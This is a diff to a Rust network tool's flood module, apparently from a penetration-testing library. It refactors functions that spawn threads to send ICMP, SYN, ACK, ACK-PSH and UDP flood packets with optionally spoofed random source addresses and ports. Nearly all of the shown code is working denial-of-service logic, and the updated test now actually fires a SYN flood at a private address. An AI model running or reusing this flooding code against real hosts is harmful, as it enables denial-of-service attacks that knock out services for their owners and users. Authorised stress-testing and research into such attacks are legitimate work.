@@ -24,7 +24,7 @@ pub mod tcp6;
 pub mod udp;
 pub mod udp6;
 
-use crate::NetInfo;
+use crate::FloodTargetWithNetInfo;
 use crate::PistolStream;
 use crate::SendPacketParam;
 use crate::error::PistolError;
@@ -39,29 +39,6 @@ pub struct FloodReport {
     pub send_packet: usize, // count
     pub send_size: usize,   // KB, MB or GB
     pub cost: Duration,
-}
-
-#[derive(Debug, Clone)]
-pub struct Flood {
-    pub layer2_cost: Duration,
-    pub flood_report: Option<FloodReport>,
-    pub start_time: DateTime<Local>,
-    pub finish_time: DateTime<Local>,
-}
-
-impl Flood {
-    pub(crate) fn new() -> Self {
-        Self {
-            layer2_cost: Duration::ZERO,
-            flood_report: None,
-            start_time: Local::now(),
-            finish_time: Local::now(),
-        }
-    }
-    pub(crate) fn finish(&mut self, flood_report: Option<FloodReport>) {
-        self.finish_time = Local::now();
-        self.flood_report = flood_report;
-    }
 }
 
 #[derive(Debug, Clone)]
@@ -228,15 +205,8 @@ fn ipv6_flood_thread(
     Ok(send_buff_size)
 }
 
-#[derive(Debug, Clone)]
-pub(crate) struct FloodTarget {
-    net_info: NetInfo,
-    dst_ports: Vec<u16>,
-    src_port: Option<u16>,
-}
-
 fn flood(
-    flood_targets: Vec<FloodTarget>,
+    flood_targets: Vec<FloodTargetWithNetInfo>,
     method: FloodMethods,
     retransmit: usize,
     repeat: usize,
@@ -251,76 +221,82 @@ fn flood(
         match ni.inferred_dst_addr {
             IpAddr::V4(dst_ipv4) => {
                 for _ in 0..repeat {
-                    for &dst_port in &ft.dst_ports {
-                        let dst_mac = ni.inferred_dst_mac;
-                        let src_mac = ni.inferred_src_mac;
-                        let src_ipv4 = match fake_src {
-                            true => random_ipv4_addr(),
-                            false => match ni.inferred_src_addr {
-                                IpAddr::V4(src_ipv4) => src_ipv4,
-                                _ => random_ipv4_addr(),
-                            },
-                        };
-                        let src_port = match fake_src {
-                            true => random_port(),
-                            false => match ft.src_port {
-                                Some(port) => port,
-                                None => random_port(),
-                            },
-                        };
-                        let dst_addr = ni.inferred_dst_addr;
+                    let dst_port = match ft.dst_port {
+                        Some(port) => port,
+                        None => 80, // default port for flood attack
+                    };
 
-                        let tx = tx.clone();
-                        let if_name = ni.inferred_interface.name.clone();
-                        thread::spawn(move || {
-                            let start_time = Instant::now();
-                            let ret = ipv4_flood_thread(
-                                dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, if_name,
-                                method, retransmit,
-                            );
-                            if let Err(e) = tx.send((dst_addr, ret, start_time)) {
-                                error!("failed to send to tx on func flood: {}", e);
-                            }
-                        });
-                        recv_size += 1;
-                    }
+                    let dst_mac = ni.inferred_dst_mac;
+                    let src_mac = ni.inferred_src_mac;
+                    let src_ipv4 = match fake_src {
+                        true => random_ipv4_addr(),
+                        false => match ni.inferred_src_addr {
+                            IpAddr::V4(src_ipv4) => src_ipv4,
+                            _ => random_ipv4_addr(),
+                        },
+                    };
+                    let src_port = match fake_src {
+                        true => random_port(),
+                        false => match ft.src_port {
+                            Some(port) => port,
+                            None => random_port(),
+                        },
+                    };
+                    let dst_addr = ni.inferred_dst_addr;
+
+                    let tx = tx.clone();
+                    let if_name = ni.inferred_interface.name.clone();
+                    thread::spawn(move || {
+                        let start_time = Instant::now();
+                        let ret = ipv4_flood_thread(
+                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, if_name,
+                            method, retransmit,
+                        );
+                        if let Err(e) = tx.send((dst_addr, ret, start_time)) {
+                            error!("failed to send to tx on func flood: {}", e);
+                        }
+                    });
+                    recv_size += 1;
                 }
             }
             IpAddr::V6(dst_ipv6) => {
                 for _ in 0..repeat {
-                    for &dst_port in &ft.dst_ports {
-                        let dst_mac = ni.inferred_dst_mac;
-                        let src_mac = ni.inferred_src_mac;
-                        let src_ipv6 = match fake_src {
-                            true => random_ipv6_addr(),
-                            false => match ni.inferred_src_addr {
-                                IpAddr::V6(src_ipv6) => src_ipv6,
-                                _ => random_ipv6_addr(),
-                            },
-                        };
-                        let src_port = match fake_src {
-                            true => random_port(),
-                            false => match ft.src_port {
-                                Some(port) => port,
-                                None => random_port(),
-                            },
-                        };
-                        let dst_addr = ni.inferred_dst_addr;
+                    let dst_port = match ft.dst_port {
+                        Some(port) => port,
+                        None => 80, // default port for flood attack
+                    };
 
-                        let tx = tx.clone();
-                        let if_name = ni.inferred_interface.name.clone();
-                        thread::spawn(move || {
-                            let start_time = Instant::now();
-                            let ret = ipv6_flood_thread(
-                                dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, if_name,
-                                method, retransmit,
-                            );
-                            if let Err(e) = tx.send((dst_addr, ret, start_time)) {
-                                error!("failed to send to tx on func flood: {}", e);
-                            }
-                        });
-                        recv_size += 1;
-                    }
+                    let dst_mac = ni.inferred_dst_mac;
+                    let src_mac = ni.inferred_src_mac;
+                    let src_ipv6 = match fake_src {
+                        true => random_ipv6_addr(),
+                        false => match ni.inferred_src_addr {
+                            IpAddr::V6(src_ipv6) => src_ipv6,
+                            _ => random_ipv6_addr(),
+                        },
+                    };
+                    let src_port = match fake_src {
+                        true => random_port(),
+                        false => match ft.src_port {
+                            Some(port) => port,
+                            None => random_port(),
+                        },
+                    };
+                    let dst_addr = ni.inferred_dst_addr;
+
+                    let tx = tx.clone();
+                    let if_name = ni.inferred_interface.name.clone();
+                    thread::spawn(move || {
+                        let start_time = Instant::now();
+                        let ret = ipv6_flood_thread(
+                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, if_name,
+                            method, retransmit,
+                        );
+                        if let Err(e) = tx.send((dst_addr, ret, start_time)) {
+                            error!("failed to send to tx on func flood: {}", e);
+                        }
+                    });
+                    recv_size += 1;
                 }
             }
         }
@@ -347,174 +323,14 @@ fn flood(
     Ok(pistol_floods)
 }
 
-pub(crate) fn flood_raw(
-    flood_target: FloodTarget,
-    method: FloodMethods,
-    retransmit: usize,
-    repeat: usize,
-    fake_src: bool,
-) -> Result<Flood, PistolError> {
-    let mut stream = PistolStream::new();
-    stream.init_without_receiver()?;
-
-    let mut flood = Flood::new();
-    let start = Instant::now();
-
-    let net_info = flood_target.net_info;
-    let dst_mac = net_info.inferred_dst_mac;
-    let dst_addr = net_info.inferred_dst_addr;
-    let src_mac = net_info.inferred_src_mac;
-    let src_addr = net_info.inferred_src_addr;
-
-    let src_port = flood_target.src_port;
-    match dst_addr {
-        IpAddr::V4(dst_ipv4) => {
-            let mut total_send_buff_size = 0;
-            for _ in 0..repeat {
-                let src_ipv4 = match fake_src {
-                    true => random_ipv4_addr(),
-                    false => match src_addr {
-                        IpAddr::V4(src_ipv4) => src_ipv4,
-                        _ => random_ipv4_addr(),
-                    },
-                };
-                let src_port = match fake_src {
-                    true => random_port(),
-                    false => match src_port {
-                        Some(src_port) => src_port,
-                        None => random_port(),
-                    },
-                };
-
-                for &dst_port in &flood_target.dst_ports {
-                    let buff = match method {
-                        FloodMethods::Icmp => icmp::build_icmp_flood_packet(dst_ipv4, src_ipv4)?,
-                        FloodMethods::Syn => {
-                            tcp::build_syn_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
-                        }
-                        FloodMethods::Ack => {
-                            tcp::build_ack_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
-                        }
-                        FloodMethods::AckPsh => {
-                            tcp::build_ack_psh_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
-                        }
-                        FloodMethods::Udp => {
-                            udp::build_udp_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
-                        }
-                    };
-                    let if_name = net_info.inferred_interface.name.clone();
-
-                    let spp = SendPacketParam {
-                        dst_mac,
-                        src_mac,
-                        eth_type: EtherTypes::Ipv4,
-                        l3_payload: buff.clone(),
-                        if_name: if_name.clone(),
-                        retransmit,
-                    };
-
-                    stream.send_packet(spp)?;
-
-                    let send_buff_size = buff.len() * retransmit;
-                    total_send_buff_size += send_buff_size;
-                }
-            }
-            let flood_report = FloodReport {
-                addr: net_info.inferred_dst_addr,
-                send_packet: retransmit * repeat,
-                send_size: total_send_buff_size,
-                cost: start.elapsed(),
-            };
-            flood.finish(Some(flood_report));
-            Ok(flood)
-        }
-        IpAddr::V6(dst_ipv6) => {
-            let mut total_send_buff_size = 0;
-            for _ in 0..repeat {
-                let src_ipv6 = match fake_src {
-                    true => random_ipv6_addr(),
-                    false => match src_addr {
-                        IpAddr::V6(src_ipv6) => src_ipv6,
-                        _ => random_ipv6_addr(),
-                    },
-                };
-                let src_port = match fake_src {
-                    true => random_port(),
-                    false => match src_port {
-                        Some(src_port) => src_port,
-                        None => random_port(),
-                    },
-                };
-
-                for &dst_port in &flood_target.dst_ports {
-                    let buff = match method {
-                        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(dst_ipv6, src_ipv6)?,
-                        FloodMethods::Syn => {
-                            tcp6::build_syn_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
-                        }
-                        FloodMethods::Ack => {
-                            tcp6::build_ack_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
-                        }
-                        FloodMethods::AckPsh => tcp6::build_ack_psh_flood_packet(
-                            dst_ipv6, dst_port, src_ipv6, src_port,
-                        )?,
-                        FloodMethods::Udp => {
-                            udp6::send_udp_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
-                        }
-                    };
-
-                    let if_name = net_info.inferred_interface.name.clone();
-
-                    let spp = SendPacketParam {
-                        dst_mac,
-                        src_mac,
-                        eth_type: EtherTypes::Ipv6,
-                        l3_payload: buff.clone(),
-                        if_name: if_name.clone(),
-                        retransmit,
-                    };
-
-                    stream.send_packet(spp)?;
-
-                    let send_buff_size = buff.len() * retransmit;
-                    total_send_buff_size += send_buff_size;
-                }
-            }
-            let flood_report = FloodReport {
-                addr: net_info.inferred_dst_addr,
-                send_packet: retransmit * repeat,
-                send_size: total_send_buff_size,
-                cost: start.elapsed(),
-            };
-            flood.finish(Some(flood_report));
-            Ok(flood)
-        }
-    }
-}
-
 pub(crate) fn icmp_flood(
-    flood_targets: Vec<FloodTarget>,
+    flood_targets: Vec<FloodTargetWithNetInfo>,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
 ) -> Result<Floods, PistolError> {
     flood(
         flood_targets,
-        FloodMethods::Icmp,
-        retransmit,
-        repeat,
-        fake_src,
-    )
-}
-
-pub(crate) fn icmp_flood_raw(
-    flood_target: FloodTarget,
-    retransmit: usize,
-    repeat: usize,
-    fake_src: bool,
-) -> Result<Flood, PistolError> {
-    flood_raw(
-        flood_target,
         FloodMethods::Icmp,
         retransmit,
         repeat,
@@ -523,28 +339,13 @@ pub(crate) fn icmp_flood_raw(
 }
 
 pub(crate) fn tcp_syn_flood(
-    flood_targets: Vec<FloodTarget>,
+    flood_targets: Vec<FloodTargetWithNetInfo>,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
 ) -> Result<Floods, PistolError> {
     flood(
         flood_targets,
-        FloodMethods::Syn,
-        retransmit,
-        repeat,
-        fake_src,
-    )
-}
-
-pub(crate) fn tcp_syn_flood_raw(
-    flood_target: FloodTarget,
-    retransmit: usize,
-    repeat: usize,
-    fake_src: bool,
-) -> Result<Flood, PistolError> {
-    flood_raw(
-        flood_target,
         FloodMethods::Syn,
         retransmit,
         repeat,
@@ -553,28 +354,13 @@ pub(crate) fn tcp_syn_flood_raw(
 }
 
 pub(crate) fn tcp_ack_flood(
-    flood_targets: Vec<FloodTarget>,
+    flood_targets: Vec<FloodTargetWithNetInfo>,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
 ) -> Result<Floods, PistolError> {
     flood(
         flood_targets,
-        FloodMethods::Ack,
-        retransmit,
-        repeat,
-        fake_src,
-    )
-}
-
-pub(crate) fn tcp_ack_flood_raw(
-    flood_target: FloodTarget,
-    retransmit: usize,
-    repeat: usize,
-    fake_src: bool,
-) -> Result<Flood, PistolError> {
-    flood_raw(
-        flood_target,
         FloodMethods::Ack,
         retransmit,
         repeat,
@@ -583,28 +369,13 @@ pub(crate) fn tcp_ack_flood_raw(
 }
 
 pub(crate) fn tcp_ack_psh_flood(
-    flood_targets: Vec<FloodTarget>,
+    flood_targets: Vec<FloodTargetWithNetInfo>,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
 ) -> Result<Floods, PistolError> {
     flood(
         flood_targets,
-        FloodMethods::AckPsh,
-        retransmit,
-        repeat,
-        fake_src,
-    )
-}
-
-pub(crate) fn tcp_ack_psh_flood_raw(
-    flood_target: FloodTarget,
-    retransmit: usize,
-    repeat: usize,
-    fake_src: bool,
-) -> Result<Flood, PistolError> {
-    flood_raw(
-        flood_target,
         FloodMethods::AckPsh,
         retransmit,
         repeat,
@@ -613,28 +384,13 @@ pub(crate) fn tcp_ack_psh_flood_raw(
 }
 
 pub(crate) fn udp_flood(
-    flood_targets: Vec<FloodTarget>,
+    flood_targets: Vec<FloodTargetWithNetInfo>,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
 ) -> Result<Floods, PistolError> {
     flood(
         flood_targets,
-        FloodMethods::Udp,
-        retransmit,
-        repeat,
-        fake_src,
-    )
-}
-
-pub(crate) fn udp_flood_raw(
-    flood_target: FloodTarget,
-    retransmit: usize,
-    repeat: usize,
-    fake_src: bool,
-) -> Result<Flood, PistolError> {
-    flood_raw(
-        flood_target,
         FloodMethods::Udp,
         retransmit,
         repeat,
@@ -646,20 +402,21 @@ pub(crate) fn udp_flood_raw(
 mod tests {
     use super::*;
     use crate::Pistol;
-    use crate::Target;
+    use crate::XxpFloodTarget;
     #[test]
     fn test_flood() {
         let dst_addr = Ipv4Addr::new(192, 168, 5, 5);
-        let ports = vec![22];
-        let target1 = Target::new(dst_addr.into(), ports, None, None);
+        let dst_port = 22;
+        let target1 = XxpFloodTarget::new(dst_addr.into(), Some(dst_port), None, None);
         let targets = vec![target1];
         let retransmit = 480; // The number of times to repeat sending the same attack packet.
         let repeat = 4; // The number of times each thread repeats the attack.
 
         let mut pistol = Pistol::new();
-        let (net_infos, dur) = pistol.get_netinfo(&targets, None).unwrap();
 
-        // let ret = tcp_syn_flood(net_infos, retransmit, repeat, true).unwrap();
-        // println!("layer2: {:.2}s, {}", dur.as_secs_f32(), ret);
+        let ret = pistol
+            .tcp_syn_flood(&targets, retransmit, repeat, true)
+            .unwrap();
+        println!("{}", ret);
     }
 }
